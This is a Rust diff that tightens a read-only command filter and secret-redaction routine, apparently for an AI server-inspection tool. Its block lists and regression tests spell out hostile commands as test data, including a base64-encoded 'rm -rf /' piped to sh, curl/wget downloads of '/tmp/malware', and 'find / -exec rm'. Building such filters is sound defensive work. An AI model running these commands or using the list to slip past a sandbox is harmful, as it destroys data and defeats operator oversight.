@@ -20,39 +20,62 @@ pub(crate) fn normalize_tool(name: &str) -> &str {
 pub(crate) fn sanitize(text: &str) -> String {
     struct Rule {
         re: Regex,
-        keep_key: bool,
+        /// 替换模板：保留 key 前缀的规则用捕获组 ${1}/${2}（含引号，保证闭合）
+        template: &'static str,
     }
     static RE: OnceLock<Vec<Rule>> = OnceLock::new();
     let res = RE.get_or_init(|| {
         vec![
-            // 常见密钥/口令键值对：password=xxx / token: "xxx"
+            // 常见密钥/口令键值对：password=xxx / token: "xxx"（支持引号内带空格的值，
+            // 替换时保留引号闭合，避免输出残留未闭合引号；regex crate 不支持
+            // 反向引用，单/双引号分别匹配）
             Rule {
                 re: Regex::new(
-                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*["']?)[^\s"',;]{6,}"#,
+                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*")([^"]{1,})""#,
                 )
                 .unwrap(),
-                keep_key: true,
+                template: "${1}${2}***\"",
+            },
+            Rule {
+                re: Regex::new(
+                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*')([^']{1,})'"#,
+                )
+                .unwrap(),
+                template: "${1}${2}***'",
+            },
+            Rule {
+                re: Regex::new(
+                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*)[^\s"',;]{6,}"#,
+                )
+                .unwrap(),
+                template: "${1}${2}***",
             },
             // AWS Access Key
-            Rule { re: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(), keep_key: false },
-            // OpenAI / DeepSeek 风格 sk- 密钥
-            Rule { re: Regex::new(r"sk-[A-Za-z0-9_\-]{16,}").unwrap(), keep_key: false },
+            Rule {
+                re: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
+                template: "***",
+            },
+            // OpenAI / DeepSeek 风格 sk- 密钥（大小写不敏感）
+            Rule {
+                re: Regex::new(r"(?i)sk-[A-Za-z0-9_\-]{16,}").unwrap(),
+                template: "***",
+            },
             // PEM 私钥块
             Rule {
                 re: Regex::new(
                     r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----",
                 )
                 .unwrap(),
-                keep_key: false,
+                template: "***",
             },
             // Bearer / Basic 认证头
             Rule {
                 re: Regex::new(r"(?i)authorization:\s*(basic|bearer)\s+[^\r\n]+").unwrap(),
-                keep_key: false,
+                template: "***",
             },
             Rule {
-                re: Regex::new(r"(?i)\bbearer\s+[A-Za-z0-9._\-]{20,}").unwrap(),
-                keep_key: false,
+                re: Regex::new(r#"(?i)\bbearer\s+["']?[A-Za-z0-9._\-]{20,}["']?"#).unwrap(),
+                template: "***",
             },
             // 常见云厂商密钥片段
             Rule {
@@ -60,17 +83,13 @@ pub(crate) fn sanitize(text: &str) -> String {
                     r#"(?i)(access[_-]?key[_-]?id|secret[_-]?access[_-]?key)(\s*[:=]\s*["']?)[^\s"',;]{10,}"#,
                 )
                 .unwrap(),
-                keep_key: true,
+                template: "${1}${2}***",
             },
         ]
     });
     let mut out = text.to_string();
     for rule in res {
-        out = if rule.keep_key {
-            rule.re.replace_all(&out, "${1}${2}***").to_string()
-        } else {
-            rule.re.replace_all(&out, "***").to_string()
-        };
+        out = rule.re.replace_all(&out, rule.template).to_string();
     }
     out
 }
@@ -153,6 +172,17 @@ const COMMAND_RULES: &[(&str, RiskTier)] = &[
     ("sed -i", RiskTier::Write),
     ("perl -i", RiskTier::Write),
     ("awk -i", RiskTier::Write),
+    // 解释器直接执行代码（绕过子串检测的写操作入口）
+    ("python3 -c", RiskTier::Write),
+    ("python -c", RiskTier::Write),
+    ("python2 -c", RiskTier::Write),
+    ("perl -e", RiskTier::Write),
+    ("ruby -e", RiskTier::Write),
+    ("node -e", RiskTier::Write),
+    ("php -r", RiskTier::Write),
+    // find 的破坏性动作
+    (" -delete", RiskTier::Write),
+    (" -exec", RiskTier::Write),
     ("vim ", RiskTier::Write),
     ("vi ", RiskTier::Write),
     ("nano ", RiskTier::Write),
@@ -174,7 +204,10 @@ const COMMAND_RULES: &[(&str, RiskTier)] = &[
     ("go install", RiskTier::Write),
     ("curl -o", RiskTier::Write),
     ("curl -o-", RiskTier::Write),
+    // 短选项组合（-Lo / -sSo）会破坏 "-o " 的连续子串，按 "-l" 兜底拦截
+    ("curl -l", RiskTier::Write),
     ("wget -o", RiskTier::Write),
+    ("wget -q", RiskTier::Write),
     ("scp ", RiskTier::Write),
     ("rsync ", RiskTier::Write),
     ("sftp ", RiskTier::Write),
@@ -237,6 +270,16 @@ fn has_unsafe_redirect(command: &str) -> bool {
     cleaned.contains('>')
 }
 
+/// 管道是否交给 shell 解释器执行（下载即执行 / base64 解码后执行等编码绕过）。
+/// 词边界判断避免误伤 `cat x | shasum` 这类名字以 sh 开头的普通工具。
+fn has_pipe_to_shell(command: &str) -> bool {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    let re = RE.get_or_init(|| {
+        Regex::new(r#"\|\s*(sh|bash|zsh|dash)(\s|;|$)"#).unwrap()
+    });
+    re.is_match(&command.to_ascii_lowercase())
+}
+
 /// 只读模式下判断命令是否包含写操作（修改 / 删除 / 安装 / 网络传输 / 重定向写文件等）。
 /// 用于 MCP 只读权限模式：该场景 exec_command 是任意 shell，docker/systemctl/apt 等
 /// 一律整体拦截（宁可多拦），因此直接复用统一规则表的整体匹配粒度。
@@ -244,7 +287,7 @@ pub(crate) fn is_write_operation(command: &str) -> bool {
     if max_tier(command).is_some() {
         return true;
     }
-    has_unsafe_redirect(command)
+    has_unsafe_redirect(command) || has_pipe_to_shell(command)
 }
 
 /// 巡检白名单场景下，`ALLOWED` 里部分工具（docker/systemctl/apt/ufw/firewall-cmd 等）本意
@@ -258,20 +301,31 @@ pub(crate) fn is_write_operation(command: &str) -> bool {
 const READONLY_EXTRA_FORBIDDEN: &[&str] = &[
     "docker exec", "docker run", "docker rm", "docker rmi", "docker stop", "docker kill",
     "docker restart", "docker build", "docker push", "docker pause", "docker unpause",
+    "docker compose", "docker-compose",
     "podman exec", "podman run", "podman rm", "podman rmi", "podman stop", "podman kill",
     "podman restart",
-    "apt install", "apt remove", "apt purge",
-    "apt-get install", "apt-get remove", "apt-get purge",
-    "yum install", "yum remove", "yum erase",
-    "dnf install", "dnf remove",
-    "zypper install", "zypper remove",
-    "pacman -s", "pacman -r",
+    "apt install", "apt remove", "apt purge", "apt update", "apt upgrade", "apt autoremove",
+    "apt-get install", "apt-get remove", "apt-get purge", "apt-get update", "apt-get upgrade",
+    "apt-get autoremove",
+    "yum install", "yum remove", "yum erase", "yum update", "yum upgrade",
+    "dnf install", "dnf remove", "dnf update", "dnf upgrade",
+    "zypper install", "zypper remove", "zypper update",
+    "pacman -s", "pacman -r", "pacman -u",
     "dpkg -i", "dpkg -r", "dpkg --purge",
     "rpm -i", "rpm -e", "rpm -u",
-    "systemctl start", "systemctl enable", "systemctl unmask", "systemctl reload", "systemctl kill",
+    "systemctl start", "systemctl stop", "systemctl restart", "systemctl enable",
+    "systemctl disable", "systemctl mask", "systemctl unmask", "systemctl reload",
+    "systemctl try-restart", "systemctl daemon-reload", "systemctl kill",
+    "systemctl set-default", "systemctl rescue", "systemctl emergency",
+    "systemctl halt", "systemctl reboot", "systemctl poweroff", "systemctl isolate",
     "ufw allow", "ufw deny", "ufw reject", "ufw limit", "ufw insert", "ufw delete",
     "ufw enable", "ufw disable", "ufw reset",
     "firewall-cmd --add", "firewall-cmd --remove", "firewall-cmd --reload",
+    // 解释器直接执行代码 / 编辑类写操作（env 已移出白名单，这里兜底解释器入口）
+    "python3 -c", "python -c", "python2 -c", "perl -e", "ruby -e", "node -e", "php -r",
+    "sed -i", "perl -i", "awk -i",
+    // find 的破坏性动作
+    " -delete", " -exec",
 ];
 
 /// 巡检动态命令白名单校验：只允许白名单内的只读命令，拒绝管道/重定向/命令替换/写操作。
@@ -316,7 +370,7 @@ pub(crate) fn validate_readonly_command(command: &str) -> Result<(), String> {
         "uptime", "uname", "hostname", "ss", "netstat", "systemctl", "journalctl", "docker",
         "podman", "sshd", "ufw", "firewall-cmd", "fail2ban-client", "last", "lastb", "who",
         "w", "id", "getent", "stat", "lsof", "sysctl", "hostnamectl", "timedatectl", "rpm",
-        "dpkg", "apt", "yum", "dnf", "zypper", "pacman", "brew", "locale", "env",
+        "dpkg", "apt", "yum", "dnf", "zypper", "pacman", "brew", "locale",
     ];
     if !ALLOWED.contains(&first) {
         return Err(format!("命令不在只读白名单内: {first}"));
@@ -347,6 +401,16 @@ mod tests {
         assert_eq!(sanitize(text), text);
     }
 
+    /// 引号包裹、大小写变体、带空格值的脱敏回归测试
+    #[test]
+    fn sanitize_handles_quoted_and_case_variants() {
+        assert_eq!(sanitize(r#"password="My Secret Value""#), r#"password="***""#);
+        assert_eq!(sanitize("token = 'abc123def456'"), "token = '***'");
+        assert_eq!(sanitize("Sk-abcdefghijklmnopqrst"), "***");
+        assert_eq!(sanitize(r#"Authorization: Bearer "eyJhbGciOiJIUzI1NiJ9""#), "***");
+        assert_eq!(sanitize("password=short"), "password=short", "过短值不匹配（避免误伤）");
+    }
+
     #[test]
     fn detects_dangerous_commands() {
         assert!(is_dangerous("rm -rf /"));
@@ -363,6 +427,21 @@ mod tests {
         assert!(is_write_operation("rm /tmp/x"));
         assert!(is_write_operation("echo hi > /tmp/a"));
         assert!(is_write_operation("curl -o /tmp/f http://x"));
+    }
+
+    /// 编码/解释器/短选项组合绕过静态子串检测的回归测试
+    #[test]
+    fn detects_encoded_and_interpreter_writes() {
+        assert!(is_write_operation("echo 'cm0gLXJmIC8K' | base64 -d | sh"));
+        assert!(is_write_operation("echo hi | bash"));
+        assert!(is_write_operation("cat x | zsh"));
+        assert!(!is_write_operation("cat x | shasum"), "| shasum 不应误判为管道 shell");
+        assert!(is_write_operation("python3 -c \"open('/tmp/x','w').write('x')\""));
+        assert!(is_write_operation("perl -e 'print 1'"));
+        assert!(is_write_operation("curl -Lo /tmp/malware http://x"));
+        assert!(is_write_operation("wget -qO /tmp/malware http://x"));
+        assert!(is_write_operation("find /tmp -delete"));
+        assert!(is_write_operation("find / -name x -exec rm {} \\;"));
     }
 
     #[test]
@@ -395,11 +474,20 @@ mod tests {
     fn validates_readonly_commands_blocks_escape_subcommands() {
         assert!(validate_readonly_command("docker exec -it web bash").is_err());
         assert!(validate_readonly_command("docker run --rm -v /:/host alpine").is_err());
+        assert!(validate_readonly_command("docker compose up -d").is_err());
         assert!(validate_readonly_command("apt install netcat").is_err());
+        assert!(validate_readonly_command("apt update").is_err());
         assert!(validate_readonly_command("systemctl start nginx").is_err());
+        assert!(validate_readonly_command("systemctl stop nginx").is_err());
         assert!(validate_readonly_command("systemctl enable nginx").is_err());
+        assert!(validate_readonly_command("systemctl try-restart nginx").is_err());
         assert!(validate_readonly_command("ufw allow 22").is_err());
         assert!(validate_readonly_command("firewall-cmd --add-port=80/tcp").is_err());
+        assert!(validate_readonly_command("env python3 -c 'open(\"/x\",\"w\")'").is_err());
+        assert!(validate_readonly_command("python3 -c 'open(\"/x\",\"w\")'").is_err());
+        assert!(validate_readonly_command("sed -i 's/a/b/' /etc/hosts").is_err());
+        assert!(validate_readonly_command("find /tmp -delete").is_err());
+        assert!(validate_readonly_command("find / -exec rm {} \\;").is_err());
     }
 
     /// is_dangerous / is_write_operation 统一从同一张风险表派生，验证 Dangerous 蕴含 Write。
